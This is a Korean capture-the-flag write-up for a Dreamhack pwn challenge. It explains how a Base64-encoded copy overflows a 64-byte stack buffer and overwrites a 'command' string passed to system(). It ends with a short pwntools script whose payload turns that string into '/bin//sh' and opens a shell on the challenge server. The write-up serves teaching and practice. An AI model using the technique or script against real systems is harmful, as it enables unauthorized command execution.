## 풀이

### 분석

IDA로 `main` 함수를 확인하면 다음과 같은 흐름을 가진다.

```c
char buf[64];
char dest[64];
char command[10];

strcpy(command, "echo bye");

while (1)
{
    puts("[1] Base64 Encode");
    puts("[2] Exit");
    printf("> ");
    scanf("%d", &v4);

    if (v4 != 1)
        break;

    v13 = read(0, buf, 0x40);
    src = (char *)sub_1269(buf, v13);
    strcpy(dest, src);
    puts(dest);
    free(src);
}

if (v4 != 2)
{
    puts("Invalid input");
    exit(-1);
}

system(command);
```

프로그램은 시작할 때 `command` 배열에 `"echo bye"`를 저장한다.

```c
strcpy(command, "echo bye");
```

이후 메뉴에서 `2`를 입력하면 다음 코드가 실행된다.

```c
system(command);
```

따라서 정상적인 경우에는 프로그램 종료 시 다음 명령어가 실행된다.

```c
system("echo bye");
```

그러나 `command`는 스택에 존재하는 지역 변수이다.  
따라서 스택 오버플로우를 이용해 `command` 값을 조작할 수 있다면, `system()`에 원하는 명령어를 전달할 수 있다.

---

`sub_1269` 함수는 입력 데이터를 Base64로 인코딩하는 함수이다.

중요한 부분은 다음과 같다.

```c
v14 = 4 * ((a2 + 2) / 3);
v13 = malloc(v14 + 1);
```

여기서 `a2`는 입력 길이이다.  
Base64 인코딩 결과 길이는 다음과 같이 계산된다.

```text
4 * ceil(input_length / 3)
```

`main`에서는 `read()`를 통해 최대 64바이트를 입력받는다.

```c
v13 = read(0, buf, 0x40);
```

입력이 64바이트일 때 Base64 인코딩 결과 길이는 다음과 같다.

```text
4 * ceil(64 / 3)
= 4 * 22
= 88
```

즉, 64바이트 입력은 Base64 인코딩 후 88바이트 문자열이 된다.

하지만 인코딩 결과는 다음 코드에 의해 64바이트 크기의 `dest` 배열로 복사된다.

```c
strcpy(dest, src);
```

`dest`의 크기는 다음과 같이 64바이트이다.

```c
char dest[64];
```

따라서 Base64 인코딩 결과가 64바이트를 초과하면 `strcpy()`에 의해 stack buffer overflow가 발생한다.

### 취약점

취약점은 다음 코드에서 발생한다.

```c
src = (char *)sub_1269(buf, v13);
strcpy(dest, src);
```

입력 버퍼 `buf`는 64바이트이고, 복사 대상인 `dest`도 64바이트이다.  
겉으로 보면 같은 크기이기 때문에 안전해 보일 수 있다.

하지만 `buf`의 내용이 그대로 복사되는 것이 아니라, Base64로 인코딩된 결과가 `dest`에 복사된다.  
Base64 인코딩은 입력보다 출력이 더 길어진다.

```text
3바이트 입력 -> 4바이트 출력
```

따라서 최대 64바이트를 입력하면 88바이트의 Base64 문자열이 생성되고, 이 문자열을 64바이트 배열인 `dest`에 복사하면서 overflow가 발생한다.

IDA에서 확인한 스택 배치는 다음과 같다.

```c
char dest[64];     // [rbp-0x70]
char command[10];  // [rbp-0x30]
```

`dest`는 `[rbp-0x70]`부터 시작하고 크기가 64바이트이다.  
따라서 `dest[64]` 위치는 바로 `[rbp-0x30]`, 즉 `command[0]` 위치가 된다.

```text
dest[0]  ~ dest[63]   : dest 영역
dest[64] ~ dest[73]   : command 영역
```

즉, `dest`를 64바이트 넘게 덮으면 바로 뒤에 있는 `command` 배열을 덮을 수 있다.

프로그램은 마지막에 다음 코드를 실행한다.

```c
system(command);
```

따라서 `command`를 `"/bin//sh"`로 덮으면 최종적으로 다음 코드가 실행된다.

```c
system("/bin//sh");
```

Unix 계열 시스템에서는 `/bin//sh`가 `/bin/sh`와 동일하게 처리되므로 쉘을 획득할 수 있다.

### 익스플로잇

1을 전송해 입력을 받게한 후 payload를 전송해 sbof를 이용하여 command값을 덮어씌운다 그 후 2를 전송해 system(command)가 실행되도록 한다.

```python
from pwn import *

p = remote("host8.dreamhack.games",11676)
p.sendlineafter(b"> ",b"1")
payload = b"A" * 48
payload += b"\xfd\xb8\xa7\xff\xfb\x21"
p.send(payload)
p.sendlineafter(b"> ",b"2")
p.interactive()


```

## 배운 점
`read(0, buf, 0x40)`만 보면 `buf[64]`에 최대 64바이트만 입력하므로 안전해 보일 수 있다.  
하지만 입력 데이터가 Base64 인코딩되면서 길이가 증가하고, 증가한 결과를 다시 64바이트 배열인 `dest`에 `strcpy()`로 복사하기 때문에 stack buffer overflow가 발생한다. 따라서 입력 크기만 보는 것이 아니라, 입력이 프로그램 내부에서 어떻게 변환되는지까지 함께 확인해야 한다는 점을 배웠다.
